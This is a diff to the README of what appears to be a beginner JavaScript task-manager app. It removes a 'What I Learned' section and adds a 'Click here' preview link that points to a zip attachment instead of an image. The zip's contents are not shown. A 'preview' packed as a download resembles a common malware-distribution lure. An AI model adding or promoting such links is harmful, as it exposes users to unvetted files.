@@ -52,27 +52,9 @@ This app helps users manage daily tasks with a clean UI and smooth user experien
 
 # 📂 Project Structure
 
+## Preview
+Click here --> ([files (1).zip](https://github.com/user-attachments/files/27307673/files.1.zip)
 
-
-
-<img src="https://capsule-render.vercel.app/api?type=rect&color=0:00ffff,100:ff00ff&height=2"/>
-
-
-## 🧠 What I Learned
-
-* DOM manipulation using JavaScript
-* Event handling (click, input, etc.)
-* Designing modern UI with CSS
-
-<img src="https://capsule-render.vercel.app/api?type=rect&color=0:00ffff,100:ff00ff&height=2"/>
-
-
-## 📸 Preview
-
-([files (1).zip](https://github.com/user-attachments/files/27307673/files.1.zip)
-
-
-)
 
 <img src="https://capsule-render.vercel.app/api?type=rect&color=0:00ffff,100:ff00ff&height=2"/>
 
